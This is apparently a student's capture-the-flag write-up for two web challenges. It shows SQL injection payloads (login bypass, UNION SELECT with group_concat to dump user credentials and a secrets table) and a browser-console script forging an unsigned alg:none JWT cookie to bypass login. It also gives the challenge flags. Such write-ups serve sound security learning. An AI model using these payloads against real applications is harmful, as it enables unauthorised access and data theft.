# WEB EXPLOITATION

# 1. Database Incursion 2.0
>DESCRIPTION
Directly access the challenge server at https://database-incursion-v2.nitephase.live/

## Solution:

1. First, I access the website through the link given in the question.
2. From the name of the challenge, I had a doubt that this challenge has something to do with database, which means SQLI.
3. When I accessed the website and saw it was a login page, I somewhat took the path of SQLi to solve the above challenge, initially.
4. So, after some trial and error in injecting some sql injections , this sqli worked - ' OR '1'='1 . So, I got pass the first login window.
5. Following this we are presented with a screen where we can see details of various employees and search via name and the page also includes a field for entering admin password.
![alt text](1.1-1.png)
6. But there was a clue that "someone from the management has the passcode". 
7. Inorder to sort the management employees accordingly, I passed the sqli - `' or department='Management'--`
8. This reveals another clue stating that an employee named 'Kiwi' has the password.
![alt text](1.2-1.png)
9. By searching or querying, for 'Kiwi' we find 4 employees named Kiwi, whom is in management, I pass the sqli - `'or (department='Management' and name='Kiwi')--`
![alt text](1.3-1.png)
10. This gives us the passcode for the next level.
11. We are directed to a admin panel, where we can run a report query and section named reports with columns and a metadata registry.
12. We know that this is an SQLi challenge. So, my plan was to mainly input SQLi payloads into the search area and get the secret stored in the metadata.
13. Before I got the right SQLi, I did multiple trial and errors and tried to make my way up.
a) simple auth bypasses - ' OR '1'='1' --
b) To Find number of columns - UNION SELECT NULL,NULL,NULL,NULL -- 
c) To Dump users (username:password) - ' UNION SELECT group_concat(username || ':' || password),NULL,NULL,NULL FROM users -- 
    which gave the output as kwA9gKGmXKYFi1MbB2WGwcNdwTstr7XM:PcnqmffOwMyV9D14N8HXzvAxlV6VuYZ9
14. Finally I passed the injection - `' UNION SELECT group_concat(secrets),NULL,NULL,NULL FROM CITADEL_ARCHIVE_2077 -- `, which Dump everything in the secrets column, by concatenating everything in that column, which revealed the flag!!
![alt text](1.4-1.png)

## Flag:
```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```

## Concepts Learnt:
- Learnt a lot in the concepts of SQLi.
- UNION NULL,NULL.......... - UNION queries only work when column count matches, so you must know the exact number before extracting data.
- group_concat(column) - merges many rows into one string. It is super useful when the site shows only one row, letting you view all values at once (like the flag).

## References:
- https://portswigger.net/web-security/sql-injection - I used this to learn some of the SQLi concepts.

***


# 2. Temporal Token
>DESCRIPTION
I made my own website with custom auth, but why can't i login with my credentials?

```
Username: Belegar
Password: Ironhammer
```

Directly access the challenge server at https://temporal-token.nitephase.live

## Solution:

1. First, on accessing the website through the link provided, I could see a login portal, where we could enter the username and password.
2. Bcz I didn't get any immediate ideas on what to do, I started looking for clues.
3. I had some guesses on what this site is gonna do, as it is a login portal, it could be a client-side token or cookie to gate access OR The challenge name Temporal Token points at time-based / timestamped tokens or tamperable session tokens.
4. I deviated into multiple other ways like:
a) Looking into the storages in the application section of the site 
b) Referring to cookies and stuff 
5. Then, I got another clue like what does this response section of the website mean?? AND it is referring to some sort of error as well.
6. After a bit of digging, I understood that the server is looking for a cookie named token containing a bearer token and Itâ€™s rejecting us because that cookie is missing.
7. So, I understood this is some kind of JWT.
8. In order to pull of this, I decided to write a Java Script into the console of the site. The js :
```js
// create a simple alg:none JWT and set it as cookie named "token"
function b64url(s){ return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); }
const header = b64url(JSON.stringify({alg:"none",typ:"JWT"}));
const payload = b64url(JSON.stringify({username:"Belegar", exp: 9999999999}));
const token = header + "." + payload + "."; // try with and without trailing dot if needed
document.cookie = "token=" + token + "; path=/";
location.reload();
```
![alt text](2.2-1.png)

9. On executing this, it revealed the flag.
![alt text](2.1-1.png)

## Flag:
```
nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?}
```

## Concepts Learnt:
- I was able to learn some of the concepts from the topic of JWT.
- Servers must always verify JWT signatures and never trust client-provided alg or payload. alg: none must always be rejected; signature verification must be enforced server-side.

## References:
https://www.jwt.io/ - I used this JWT decoder to construct the logic behind the JS and manually verifying it.

***